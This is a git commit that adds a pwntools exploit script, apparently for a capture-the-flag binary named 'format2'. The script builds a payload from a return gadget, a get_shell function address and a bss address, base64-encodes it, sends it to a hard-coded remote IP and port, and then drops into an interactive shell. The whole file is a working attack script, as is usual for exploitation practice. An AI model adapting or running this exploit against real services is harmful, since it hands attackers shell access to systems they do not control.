675b5e724a4e1f4ea0139b510a302dc8e35df938
I0gan <l418894113@gmail.com>
2020-05-04 11:11:12 +0800

    new

---
+++ stack/basis/format2/exp.py
@@ -0,0 +1,75 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+# Author: I0gan
+
+from pwn import *
+from base64 import *
+#from LibcSearcher import LibcSearcher
+
+context.log_level='debug'
+#context(arch = 'i386', os = 'linux', log_level='debug')
+#context(arch = 'amd64', os = 'linux', log_level='debug')
+
+exeFile = 'format2'
+libFile = '/lib/x86_64-linux-gnu/libc.so.6'
+
+remoteIp = "124.126.19.106"
+remotePort = 53187
+
+LOCAL = 0
+LIB   = 0
+
+r   =  lambda x : io.recv(x)
+ra  =  lambda   : io.recvall()
+rl  =  lambda   : io.recvline(keepends = True)
+ru  =  lambda x : io.recvuntil(x, drop = True)
+s   =  lambda x : io.send(x)
+sl  =  lambda x : io.sendline(x)
+sa  =  lambda x, y : io.sendafter(x, y)
+sla =  lambda x, y : io.sendlineafter(x, y)
+ia  =  lambda : io.interactive()
+c   =  lambda : io.close()
+li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
+db    = lambda   : gdb.attach(io)
+
+#--------------------------Func-----------------------------
+
+
+#--------------------------Exploit--------------------------
+def exploit():
+	get_shell = 0x08049284
+	ret = 0x08049425
+	bss = 0x0811EB40
+
+	ru(':')
+	p = p32(ret)
+	p += p32(get_shell)
+	p += p32(bss)
+	p = base64.b64encode(p)
+
+	sl(p)
+
+	
+def finish():
+	ia()
+	c()
+
+#--------------------------Main-----------------------------
+if __name__ == '__main__':
+	
+	if LOCAL:
+		exe = ELF(exeFile)
+		if LIB:
+			lib = ELF(libFile)
+			io = exe.process(env = {"LD_PRELOAD" : libFile})
+		else:
+			io = exe.process()
+	
+	else:
+		exe = ELF(exeFile)
+		io = remote(remoteIp, remotePort)
+		if LIB:
+			lib = ELF(libFile)
+	
+	exploit()
+	finish()
